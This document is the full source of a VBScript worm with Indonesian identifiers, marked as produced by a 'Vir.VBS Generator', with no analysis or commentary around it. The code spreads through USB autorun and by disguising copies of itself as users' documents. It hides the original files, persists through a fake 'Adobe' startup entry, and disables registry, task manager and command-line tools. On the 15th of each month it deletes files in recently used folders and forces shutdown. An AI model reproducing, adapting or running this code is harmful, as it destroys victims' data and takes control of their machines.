Rem Bagong2707074284
On Error Resume Next
Dim Reg, fso, Induk
Set Reg = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set Induk = fso.GetFile(Wscript.ScriptFullName)
If Induk <> Reg.SpecialFolders("AppData") & "\Adobe.vbs" then
If fso.fileExists(Left(Induk, Len(Induk) - 4)) Then
Reg.Run (Reg.RegRead("HKCR\" & BacaHandle("mp3") & "\shell\Open\command\") & " " & chr(34) & Left(Induk, len(Induk)-3) & chr(34))
Else
Reg.Run (Reg.RegRead("HKCR\" & BacaHandle("mp3") & "\shell\Open\command\") & " " & chr(34) & chr(34))
End If
End If
AutoFlash
Sebar1
Sebar2
Samar
Pertahanan
ShortCut
SerangFile (Left(Induk, InStrRev(Induk, " \ ")))
SerangFolder (Left(Induk, InStrRev(Induk, " \ ")))
SerangDrive("c:\")
SerangDrive("d:\")
SerangDrive("e:\")
SerangDrive("f:\")
SerangDrive("g:\")
AlwaysRun
Bom
SerangRecent


Sub AutoFlash
On Error Resume Next
Dim flashdrive, auto, tf1, tf2
For Each flashdrive In fso.drives
If (flashdrive.drivetype = 1 or flashdrive.drivetype = 2) and flashdrive.path <> "A:" then
Set auto = fso.CreateTextFile(flashdrive.Path & ("\AutoRun.inf"), True)
auto.Write ("[autorun]"& vbcrlf & "shellexecute=wscript.exe Dataku.vbs")
auto.Close
set tf1=fso.getfile(flashdrive.path & "\AutoRun.inf")
tf1.Attributes = 32
Induk.Copy (flashdrive.Path & "\Dataku.vbs")
set tf2=fso.getfile(flashdrive.path & "\Dataku.vbs")
tf2.Attributes = 32
End If
Next
End Sub

Sub SerangDrive (Lokasi)
On Error Resume Next
Dim drv
If fso.DriveExists(Lokasi) Then
Set drv = fso.GetDrive(fso.GetDriveName(Lokasi))
If drv.DriveType = 1 Or drv.DriveType = 2 Then
CopyVbs (Lokasi & "\New File.vbs")
SerangFolder (Lokasi)
End If
End If
End Sub

Sub SerangFolder (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Reg.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\Readme.vbs")
SerangFile (target)
SerangFolder2 (target)
Next
End Sub

Sub SerangFolder2 (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Reg.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\Money.vbs")
SerangFile (target)
SerangFolder3 (target)
Next
End Sub

Sub SerangFolder3 (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Reg.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\Hasil.vbs")
SerangFile (target)
Next
End Sub

Sub SerangFile (Lokasi)
On Error Resume Next
Dim target
For Each target In fso.GetFolder(Lokasi).Files
If lcase(Right(target,3))="doc" then
if Left(target,2)<> "~$" then CopyVbs(target & ".vbs")
HilangFile (target)
End If
If lcase(Right(target,3))="xls" or lcase(Right(target,3))="ppt" or lcase(Right(target,3))="pdf" or lcase(Right(target,3))="rtf" or lcase(Right(target,3))="rar" or lcase(Right(target,3))="zip" or lcase(Right(target,3))="jpg" or lcase(Right(target,3))="gif" or lcase(Right(target,3))="bmp" then
if Left(target,2)<> "~$" then CopyVbs(Left(target, len(target)-3) & "vbs")
End If
If lcase(Right(target,4))="docx" or lcase(Right(target,4))="xlsx" or lcase(Right(target,4))="pptx" then
if Left(target,2)<> "~$" then CopyVbs(Left(target, len(target)-4) & "vbs")
End If
if lcase(Right(target,3))="vbs" then KillVBS(target)
Next
End sub

Sub Pertahanan
On Error Resume Next
Reg.RegWrite "HKCR\inffile\shell\Install\command\", "logoff.exe"
Reg.RegWrite "HKCR\regfile\shell\open\command\", "logoff.exe"
Reg.RegWrite "HKCR\VBSFile\Shell\Edit\Command\", "logoff.exe"
Reg.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegedit", "1", "REG_DWORD"
Reg.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "0", "REG_DWORD"
Reg.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "1", "REG_DWORD"
Reg.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileAssociate", "1", "REG_DWORD"
Reg.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", "1", "REG_DWORD"
Reg.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", "1", "REG_DWORD"
Reg.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions", "1", "REG_DWORD"
Reg.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD", "1", "REG_DWORD"
Reg.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\DisableTaskMgr", "1", "REG_DWORD"
Reg.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe\Debugger","Notepad.exe"
Reg.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe\Debugger","Notepad.exe"
Reg.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe\Debugger","Notepad.exe"
Reg.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedt32.exe\Debugger","Notepad.exe"
Reg.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TaskMgr.exe\Debugger","Notepad.exe"
Reg.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\attrib.exe\Debugger","Notepad.exe"
Reg.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\install.exe\Debugger","Notepad.exe"
Reg.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setup.exe\Debugger","Notepad.exe"
End Sub

Sub Samar
On Error Resume Next
Dim HandleDoc, HandleVbs
HandleDoc = "HKEY_CLASSES_ROOT\" & BacaHandle("mp3")
HandleVbs = "HKEY_CLASSES_ROOT\" & BacaHandle("VBS")
Reg.RegWrite HandleVbs & "\", Reg.RegRead(HandleDoc & "\")
Reg.RegWrite HandleVbs & "\DefaultIcon\", Reg.RegRead(HandleDoc & "\DefaultIcon\")
Reg.RegWrite HandleVbs & "\NeverShowExt",""
Reg.RegWrite "HKCR\VBSFile\FriendlyTypeName", Reg.RegRead(HandleDoc & "\")
End Sub

Sub ShortCut
On Error Resume Next
Dim lnk, lok
lok = Reg.SpecialFolders("Favorites") & "\Adobe.lnk"
Set lnk = Reg.CreateShortCut(lok)
Induk.Copy (Reg.SpecialFolders("AppData") & "\Adobe.vbs")
lnk.TargetPath = Reg.ExpandEnvironmentStrings(Reg.SpecialFolders("AppData") & "\Adobe.vbs")
lnk.Save
HilangFile (lok)
Reg.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Adobe", lok
End Sub

Sub HilangFile (AlamatFile)
Dim f1
Set f1 = fso.GetFile(AlamatFile)
f1.Attributes = 6
End sub

Sub CopyVbs (Alamat)
On Error Resume Next
Dim data, ts, s, a, tf
Randomize
data = Left(Rnd(15) * 10000000000, 10)
Set ts = fso.openTextFile(Induk, 1)
a = ts.ReadAll
s = Right(a, Len(a) -22)
ts.Close
Set tf = fso.CreateTextFile(Alamat, True)
tf.WriteLine ("Rem Bagong" & data)
tf.Write s
tf.Close
Set ts = fso.GetFile(Alamat)
ts.Attributes = 1
End sub

Function BacaHandle(TipeFile)
BacaHandle = reg.RegRead ("HKEY_CLASSES_ROOT\." & TipeFile & "\")
End Function

Sub KillVBS(alamat)
On Error Resume Next
Dim ts, s, i, a, b
Set ts = fso.openTextFile(alamat, 1)
s = ts.Readline
ts.Close
a = instr(s, "Bagong")
If a = 0 Or a = "" Then
Set ts = fso.GetFile(alamat)
ts.Attributes = 0
Set ts = fso.openTextFile(Induk, 1)
i = ts.ReadAll
ts.Close
Set ts = fso.CreateTextfile(alamat, True)
ts.Write i
ts.Close
End If
End sub

sub AlwaysRun
On Error Resume Next
Dim mf, check
If Wscript.ScriptFullname = Reg.SpecialFolders("AppData") & "\Adobe.vbs" then
Do
Set mf = fso.getfile(Wscript.ScriptFullname)
check = mf.Drive.drivetype
If check <> 1 Then Wscript.sleep 200000
Reg.run fso.getspecialfolder(0) & "\explorer.exe /e,/select, " & Wscript.ScriptFullname
AutoFlash
Sebar1
SerangDrive("d:\")
SerangDrive("e:\")
Loop While check <> 1
End If
End sub

Sub Sebar1
dim nilai
nilai=Left(Reg.SpecialFolders("Desktop"),3) & "Windows\System.vbs"
CopyVBS (nilai)
HilangFile(nilai)
SerangFolder(Reg.SpecialFolders("MyDocuments"))
CopyVbs(Reg.SpecialFolders("NetHood") & "\Cerita 17.txt.vbs")
End Sub

Sub SerangRecent
On Error Resume Next
Dim target, ok
For Each target in fso.GetFolder(Reg.SpecialFolders("Recent")).Files
Set ok = reg.CreateShortCut(target)
if fso.FolderExists(ok.WorkingDirectory) then SerangFolder (ok.WorkingDirectory)
Next
End sub

Sub Bom
On Error Resume Next
Dim target, ok, targethapus, tmp2, tmp3
If Day(Now) = 15 Then
Reg.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Dor", "logoff.exe"
Reg.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\System", "shutdown -s -f -t 5"
For Each target in fso.GetFolder(Reg.SpecialFolders("Recent")).Files
Set ok = reg.CreateShortCut(target)
tmp3 = ok.WorkingDirectory
If fso.FolderExists(tmp3) Then
For Each targethapus In fso.GetFolder(tmp3).Files
Set tmp2 = fso.GetFile(targethapus)
tmp2.Delete
Next
End If
Next
End If
End sub

Rem Created by Vir.VBS Generator V.1
